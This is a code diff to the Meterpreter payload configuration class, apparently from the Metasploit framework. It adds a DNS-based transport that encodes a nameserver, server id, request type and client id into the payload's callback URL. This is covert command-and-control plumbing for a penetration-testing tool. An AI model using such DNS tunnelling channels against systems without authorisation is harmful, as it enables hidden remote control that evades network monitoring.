@@ -8,6 +8,7 @@ class Rex::Payloads::Meterpreter::Config
 
   URL_SIZE = 512
   UA_SIZE = 256
+  NS_NAME_SIZE = 128
   PROXY_HOST_SIZE = 128
   PROXY_USER_SIZE = 64
   PROXY_PASS_SIZE = 64
@@ -78,12 +79,30 @@ private
       lhost = "[#{lhost}]"
     end
 
-    url = "#{opts[:scheme]}://#{lhost}"
-    url << ":#{opts[:lport]}" if opts[:lport]
-    url << "#{opts[:uri]}/" if opts[:uri]
-    url << "?#{opts[:scope_id]}" if opts[:scope_id]
+    if lhost && opts[:scheme].start_with?('dns')
+      ns_server = opts[:nhost]
+      server_id = opts[:server_id]
+      client_id = '0'
 
-    # if the transport URI is for a HTTP payload we need to add a stack
+      case opts[:req_type]
+      when 'IPv6'
+        req_type = 28
+      when 'DNSKEY'
+        req_type = 48
+      else
+        req_type = 48
+      end
+
+      url = "#{opts[:scheme]}://#{lhost.to_s}?ns=#{ns_server.to_s}&sid=#{server_id.to_s}&req=#{req_type.to_s}&cli=#{client_id.to_s}&"
+
+    else
+      url = "#{opts[:scheme]}://#{lhost}"
+      url << ":#{opts[:lport]}" if opts[:lport]
+      url << "#{opts[:uri]}/" if opts[:uri]
+      url << "?#{opts[:scope_id]}" if opts[:scope_id]
+    end
+
+    # if the transport URI is for a HTTP or DNS payload we need to add a stack
     # of other stuff
     pack = 'A*VVV'
     transport_data = [
